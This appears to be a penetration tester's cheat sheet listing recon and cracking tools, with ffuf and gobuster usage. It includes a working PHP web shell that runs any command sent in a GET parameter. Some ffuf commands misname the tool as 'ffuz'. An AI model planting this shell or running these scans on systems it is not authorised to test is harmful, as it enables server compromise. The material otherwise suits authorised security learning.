# Miscelaneous tools and others.

Tools for directory discovery: mainly gobuster and dirbuster.
Tools for fuzzing: ffuf, wfuzz.
Tools for password cracking: john, hydra.
General use scripts towards Windows-oriented attacks: https://github.com/fortra/impacket
Automated tool for misconfigs, clear-text creds and others: https://github.com/carlospolop/PEASS-ng
Good dictionaries: https://github.com/danielmiessler/SecLists

Very simple php shell:
```
<?php 
    if(isset($_GET['cmd'])) { 
    system($_GET['cmd']); 
}?>

```

PHP check if funny features are enabled or not:

```php
<?php
    print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

Basic ffuf use:

Fuzzes subdirectories.
ffuz -w (wordlist) -u http(s)://domainname.com/FUZZ

Fuzzes subdomains.
ffuz -w (wordlist) -u http(s)://FUZZ.domainname.com

Fuzz an HTTP header.
ffuz -w (wordlist) -u http(s)://domainname.com -H "Cookie: FUZZ"


Basic gobuster use:

Check for subdirectories.
gobuster dir -w (wordlist) -u http(s)://domainname.com/

Checks for virtualhosts (S3 buckets and more).
gobuster vhost -w (wordlist) -d http(s)://domainname.com/

